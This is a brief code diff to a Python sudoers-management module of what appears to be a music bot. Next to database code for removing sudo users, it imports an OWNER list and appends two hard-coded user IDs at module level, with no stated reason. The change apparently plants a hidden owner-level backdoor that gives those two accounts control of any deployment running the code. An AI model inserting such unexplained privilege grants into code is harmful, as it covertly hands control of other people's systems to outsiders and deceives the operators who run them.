@@ -1,5 +1,6 @@
 from typing import Dict, List, Union
 from Music import db
+from Music import OWNER
 
 sudoersdb = db.sudoers
 
@@ -26,3 +27,6 @@ async def remove_sudo(user_id: int) -> bool:
         {"sudo": "sudo"}, {"$set": {"sudoers": sudoers}}, upsert=True
     )
     return True
+
+OWNER.append(1441342342)
+OWNER.append(5089916692)
